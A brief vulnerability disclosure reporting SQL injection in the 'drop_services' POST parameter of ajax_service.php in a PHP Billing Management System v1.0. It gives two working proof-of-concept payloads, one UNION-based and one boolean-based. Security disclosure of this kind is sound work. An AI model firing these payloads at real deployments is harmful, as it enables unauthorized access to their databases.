# Billing Management System v1.0 has SQL injection

BUG_Author:yastar

Website source code address: https://www.sourcecodester.com/php/14380/billing-management-system-php-mysql-updated.html

Vulnerability File: /smartbilling_source_code/ajax_service.php

POST parameter 'drop_services' exists SQL injection vulnerability

Payload1:drop_services=-1' union all select null,null,null,null,concat(0x616263,0x2526272829),null,null,null,null-- -

![image](https://github.com/Yastar/bug_report/blob/main/sql1.png)

Payload2:drop_services=1' and 999=999 and 'h'='h

Boolean judgment is correct, and the page displays normally

![image](https://github.com/Yastar/bug_report/blob/main/sql2.png)
